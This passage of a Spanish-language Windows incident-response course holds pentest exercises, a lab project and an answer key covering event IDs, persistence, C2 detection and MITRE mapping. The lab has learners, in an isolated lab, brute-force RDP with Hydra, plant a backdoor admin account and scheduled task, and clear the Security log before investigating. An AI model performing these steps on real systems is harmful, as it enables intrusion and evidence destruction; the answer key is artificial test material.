+**9.1** Antes de tocar una tecla en un pentest real, ¿cuáles son las tres condiciones que lo vuelven legítimo?
+
+**9.2** Emparejá cada herramienta con la huella que deja en el defensor: `Hydra`, `Responder`, `Mimikatz (DCSync)`, `Sliver (C2)`. Huellas: `4662 con GUID de replicación`, `4625 en ráfaga`, `conexión saliente persistente`, `tráfico LLMNR anómalo`.
+
+**9.3** 🧪 **Ejercicio del círculo completo.** En el laboratorio: (1) desde Kali, forzá el RDP de la víctima con Hydra; (2) en la víctima, andá al canal Security y encontrá los eventos que generó tu ataque. ¿Cuántos 4625 ves? ¿Aparece algún 4624? Documentá la correspondencia acción → artefacto.
+
+**9.4** ¿Por qué el exploit EternalBlue (MS17-010) se usa en el laboratorio con una víctima *sin parchear*, y qué demuestra pedagógicamente?
+
+**9.5** ¿Por qué un pentest termina siempre en un reporte y no en «entré»?
+
+---
+
+## Proyecto integrador
+
+Sobre tu laboratorio aislado, reproducí el caso completo del escenario y documentá cada paso con su evidencia:
+
+1. Montá `SRV-MADERA01` (Windows Server 2019 de evaluación) y Kali en red host-only. Tomá un snapshot.
+2. Publicá el RDP internamente y forzalo con Hydra (rol atacante).
+3. Con el acceso, creá la cuenta `sqlbackup`, sumala a Administradores, instalá una tarea programada de persistencia y borrá el registro de seguridad (rol atacante).
+4. Cambiá de silla: como defensor, sin mirar lo que hiciste, investigá el servidor siguiendo la **checklist de la guía §9.5** y reconstruí la línea de tiempo.
+5. Escribí un informe de una página: qué pasó (con Event IDs y horas), mapeo MITRE ATT&CK, y las cuatro recomendaciones de causa raíz.
+6. Restaurá el snapshot.
+
+**Criterio de logro:** tu línea de tiempo reconstruida como defensor coincide con lo que hiciste como atacante, y cada afirmación del informe tiene su evidencia (evento o salida de comando).
+
+---
+
+## Soluciones
+
+### Bloque 1
+**1.1** Privadas: `10.10.0.10` (rango 10.x) y `192.168.56.20` (rango 192.168.x), reservadas para redes internas por la RFC 1918. Fuera de los rangos privados: `198.51.100.77` y `203.0.113.9`. En esta guía representan «direcciones de internet», aunque en rigor pertenecen a rangos reservados para documentación (RFC 5737), elegidos para no apuntar a ningún equipo real; lo que importa para el ejercicio es que **no** son privadas. La clave de la clasificación es el rango: `10.x` y `192.168.x` son internas; lo demás, externo al servidor.
+**1.2** Es RDP (Escritorio Remoto). Publicarlo a internet expone la puerta de administración del servidor a cualquiera en el mundo, que puede intentar fuerza bruta sin siquiera estar en la red de la empresa. Es la puerta por la que entra el atacante del caso.
+**1.3** `445`→SMB, `88`→Kerberos, `389`→LDAP, `53`→DNS, `3389`→RDP.
+**1.4** El DC concentra la autoridad sobre todas las cuentas del dominio. Comprometer una PC afecta a un usuario; comprometer el DC permite crear cuentas, cambiar contraseñas y controlar toda la red, volviéndose indistinguible de un administrador legítimo.
+**1.5** Porque el nombre es cosmético y se puede cambiar o imitar; el SID es único e inmutable. El SID permite distinguir una cuenta real de una impostora con nombre parecido y correlacionar eventos aunque el nombre haya cambiado.
+
+### Bloque 2
+**2.1** Más volátil → más estable: `procesos en memoria` → `conexiones de red activas` → `documento en el disco` → `log archivado en el NAS`. La memoria y las conexiones desaparecen en segundos; el disco y los archivos archivados persisten. Es el orden de volatilidad de la RFC 3227.
+**2.2** Un reinicio borra toda la evidencia volátil: conexiones activas, procesos del atacante en memoria, sesiones abiertas. Si el intruso corría algo sólo en memoria, se pierde sin rastro. Propuesta: primero observar y anotar lo vivo (conexiones, procesos, sesiones), después mirar los registros, y recién considerar intervenir con un plan.
+**2.3** Secuencia: documentar la cuenta (cuándo se creó, a qué grupos pertenece, qué hizo) → buscar otras puertas (servicios, tareas, más cuentas) → planificar la contención → recién ahí deshabilitar/borrar. No se empieza borrando porque destruye evidencia y, si el atacante tiene otra vía de entrada, sólo le avisa que fue descubierto.
+**2.4** Preparación: *tener Sysmon instalado de antemano*. Detección y análisis: *reconstruir la línea de tiempo*. Contención/erradicación/recuperación: *cerrar el 3389 y cambiar contraseñas*. Actividad post-incidente: *el informe de lecciones aprendidas*.
+
+### Bloque 3
+**3.1** (a) Security; (b) System; (c) Application.
+**3.2** `Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625; StartTime='2026-05-04 00:00'; EndTime='2026-05-05 00:00'}`.
+**3.3** Corrés `wevtutil gl Security` para ver el tamaño máximo y la política de retención. La explicación alternativa: si el log es chico y hay mucha actividad, la rotación normal sobrescribe los eventos viejos —no es borrado malicioso—. El borrado deja un evento 1102; la rotación, no.
+**3.4** Ejercicio de laboratorio: se registran los valores observados. Un 4624 de inicio local mostrará típicamente Logon Type 2 (interactivo); el Logon ID es un valor hexadecimal que identifica esa sesión.
+
+### Bloque 4
+**4.1** Es un ataque de fuerza bruta contra la cuenta `Administrador`: `0xC000006A` = contraseña incorrecta para un usuario que **existe**, 843 veces desde una IP, en una hora de madrugada. Si el subestado fuera `0xC0000064` (el usuario **no** existe), indicaría más bien enumeración de usuarios —probar nombres— en vez de fuerza bruta de contraseña sobre una cuenta conocida.
+**4.2** Tipo 10 = RemoteInteractive = inicio por RDP/Escritorio Remoto. Combinado con una IP de origen pública (ajena a la red interna) y una hora de madrugada, indica que alguien de fuera de la empresa entró por escritorio remoto fuera de todo horario laboral: el acceso del atacante.
+**4.3** Buscar en el canal Security un evento 4624 cuyo Logon ID coincida con `0x7A441` (o encadenar: el 4624 del RDP → la creación de `sqlbackup` → el 1102 hecho por `sqlbackup`). El 4624 correlacionado trae el `Source Network Address`, la IP desde la que se conectó quien borró.
+**4.4** Porque, ante un vaciado completo del log por la vía normal, Windows escribe el evento 1102 *después* de limpiarlo, como primer registro del log recién vaciado, con el SID de quien lo ordenó: el acto de tapar deja su propia marca. Salvedad (guía §5.3): esto vale para el *clear* completo; existen manipulaciones más finas (borrado de registros individuales del `.evtx`) que no generan 1102, y por eso la defensa de fondo es centralizar los eventos fuera del servidor (WEF).
+**4.5** Porque en un sistema sano el registro está lleno de eventos rutinarios. Un log sospechosamente limpio, o con un hueco temporal en horas de actividad conocida, es en sí mismo un indicador de manipulación: la ausencia de datos es un dato.
+
+### Bloque 5
+**5.1** `sqlbackup`: no está en la línea de base, su contraseña se creó de madrugada justo tras el acceso del atacante, y tiene privilegios de administrador. Reúne los tres indicadores de una puerta trasera.
+**5.2** (1) Vive en una carpeta temporal, donde el software serio no se instala de forma permanente; (2) arranque automático, típico de persistencia; (3) el nombre `wsvc.exe` imita un servicio de sistema. Habría que verificar su firma, fecha de creación y qué hace.
+**5.3** La secuencia es 4720 (cuenta creada) seguido de 4732 (agregada a Administradores) con la misma cuenta. El 4732 es para grupos **locales** con seguridad habilitada (como `Administradores`); el 4728 es para grupos **globales** de dominio (como `Domain Admins`).
+**5.4** Evento 4698 (tarea programada creada), en el canal Security (requiere la auditoría correspondiente habilitada).
+**5.5** Porque el atacante suele dejar persistencia independiente de esa contraseña: una cuenta propia (`sqlbackup`), un servicio o una tarea. Cambiar la contraseña del `Administrador` cierra una puerta pero deja las otras abiertas; hay que buscar y cerrar todos los mecanismos de persistencia.
+
+### Bloque 6
+**6.1** La más sospechosa es la segunda: una conexión **saliente** del servidor al puerto 443 de `203.0.113.9`, una IP de internet desconocida, sostenida por el PID 6688 —candidata a canal de control—. Claramente normal: la tercera, un recurso compartido (445) usado por una PC interna (`10.10.0.34`).
+**6.2** `tasklist /svc /fi "PID eq 6688"` y `Get-CimInstance Win32_Process -Filter "ProcessId = 6688" | Select-Object Name, CommandLine, ExecutablePath, ParentProcessId`. El segundo revela la ruta, la línea de comandos (a qué IP se conecta) y el proceso padre.
+**6.3** Que la conexión es intermitente: `netstat` es una foto del instante y el canal de control se conecta a ratos. Para el histórico necesitás el evento 5156 (si está la auditoría de filtrado) o la telemetría de Sysmon (evento 3).
+**6.4** El nombre tiene un **cero** en lugar de la «o» (`svch0st` en vez de `svchost`), imitando un proceso legítimo del sistema. Se mira la línea de comandos porque el nombre se falsifica trivialmente, mientras que los argumentos revelan la intención real (la IP y el puerto de conexión).
+**6.5** Ejercicio de laboratorio: se listan los puertos en escucha; el candidato a vicio es el `3389` (RDP), que publicado a internet es la puerta del escenario.
+
+### Bloque 7
+**7.1** Te perdés el evento 4688 (creación de proceso). Se habilita con `auditpol /set /subcategory:"Creación de procesos" /success:enable` (o por GPO, subcategoría *Audit Process Creation*).
+**7.2** Falta activar la política `Plantillas administrativas → Sistema → Auditar la creación de procesos → Incluir la línea de comandos en los eventos de creación de procesos`. Son dos pasos: la auditoría y, aparte, la inclusión de la línea de comandos.
+**7.3** Tres ejemplos: cada conexión de red vinculada a su proceso (Sysmon Id. 3), la carga de DLLs (Id. 7), la creación de hilos remotos/inyección (Id. 8), las consultas DNS (Id. 22), la creación de archivos (Id. 11). Es «preventivo, no retroactivo» porque sólo registra desde el momento en que se instala: no recupera lo ocurrido antes.
+**7.4** Porque WEF copia los eventos en tiempo real a un servidor recolector separado. Si el atacante borra el log local (evento 1102), la copia centralizada sobrevive: el borrado local ya no destruye la evidencia.
+
+### Bloque 8
+**8.1** (a) Hipótesis: alguien usó el servidor fuera de horario; artefacto: 4624 tipo 10 desde IP externa. (b) Hipótesis: acceso no autorizado a los recursos compartidos; artefacto: evento 5140 / `Get-SmbSession`.
+**8.2** Orden: `843 × 4625` (fuerza bruta) → `4624 tipo 10 desde IP pública` (acceso conseguido) → `4720 sqlbackup` (puerta trasera) → `proceso a 203.0.113.9:443` (canal de control) → `1102 borrado` (antiforense). Historia: un atacante forzó el RDP, entró, creó una cuenta con privilegios, abrió un canal de control y borró el registro para taparse.
+**8.3** Fuerza bruta → T1110; crear cuenta → T1136; tarea programada → T1053; canal de control → T1071; borrar el log → T1070.001.
+**8.4** (a) hecho; (b) interpretación (y débil: la IP de origen no prueba nacionalidad ni identidad); (c) hecho.
+**8.5** (1) Cerrar el RDP publicado a internet (acceso remoto por VPN); (2) habilitar la auditoría avanzada y Sysmon; (3) quitar privilegios de más a las cuentas de servicio y aplicar contraseñas que expiren; (4) centralizar los eventos con WEF.
+
+### Bloque 9
+**9.1** Autorización por escrito del dueño, alcance (scope) explícito, y no daño (no destruir datos ni degradar el servicio; registrar todo para revertir).
+**9.2** `Hydra`→`4625 en ráfaga`; `Responder`→`tráfico LLMNR anómalo`; `Mimikatz (DCSync)`→`4662 con GUID de replicación`; `Sliver (C2)`→`conexión saliente persistente`.
+**9.3** Ejercicio de laboratorio: se verifica la correspondencia. Se espera una ráfaga de eventos 4625 igual al número de intentos de Hydra; aparece un 4624 (tipo 10) sólo si alguna contraseña del diccionario acierta. La correspondencia acción → artefacto es el objetivo.
+**9.4** Porque EternalBlue explota una falla de SMBv1 (MS17-010) que Microsoft parcheó en 2017; una víctima parcheada no es vulnerable. Con una sin parchear se ve una explotación real de principio a fin, y demuestra por qué mantener los sistemas actualizados es una defensa concreta.
+**9.5** Porque el valor de un pentest no es demostrar que se puede entrar —casi siempre se puede— sino entregar al dueño un mapa accionable de sus debilidades y cómo corregirlas, priorizado por riesgo. Sin reporte, no mejora la defensa.
+
+### Proyecto integrador
+No tiene solución única: se evalúa por el **criterio de logro**. La línea de tiempo reconstruida como defensor debe coincidir con la secuencia ejecutada como atacante, y cada afirmación del informe debe estar respaldada por un Event ID con su hora o por una salida de comando. Si algo que hiciste como atacante no dejó rastro detectable, esa es una lección valiosa sobre los límites de la auditoría sin telemetría previa (y un argumento para la sección 8 de la guía).
